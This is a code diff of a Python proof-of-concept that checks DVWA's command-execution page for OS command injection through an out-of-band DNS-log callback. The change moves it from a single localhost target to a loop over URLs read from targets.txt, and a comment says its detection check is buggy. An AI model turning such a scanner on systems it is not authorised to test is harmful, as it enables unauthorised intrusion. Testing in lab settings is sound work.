@@ -56,7 +56,7 @@ def get_dnslog_info():
     return response.text
 
 # 目标机发起dnslog请求
-def check_poc():
+def check_poc(domain):
     cookies = {
         'security': 'low',
         'csrftoken': '4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q',
@@ -88,13 +88,21 @@ def check_poc():
         'Submit': 'Submit',
     }
 
-    response = requests.post('http://127.0.0.1/dvwa/vulnerabilities/exec/', cookies=cookies, headers=headers, data=data)
-    # print(response.text)
-    if int(response.status_code) == 200 and get_dnslog_info():
-        print(get_dnslog_info())
-        print("存在命令执行漏洞")
+    try:
+        response = requests.post(domain, cookies=cookies, headers=headers, data=data)
+        # print(response.text)
+
+        # yumu判断语句有bug
+        if int(response.status_code) == 200 and get_dnslog_info():
+            # print(get_dnslog_info())
+            print("存在命令执行漏洞")
+    except Exception as e:
+        print('oops,出错了')
+
 
 if __name__ == '__main__':
-    check_poc()
+    with open("./targets.txt") as f:
+        for i in f.readlines():
+            check_poc(i.replace('\n',''))
     # get_dnslog_info()
     # get_domain()
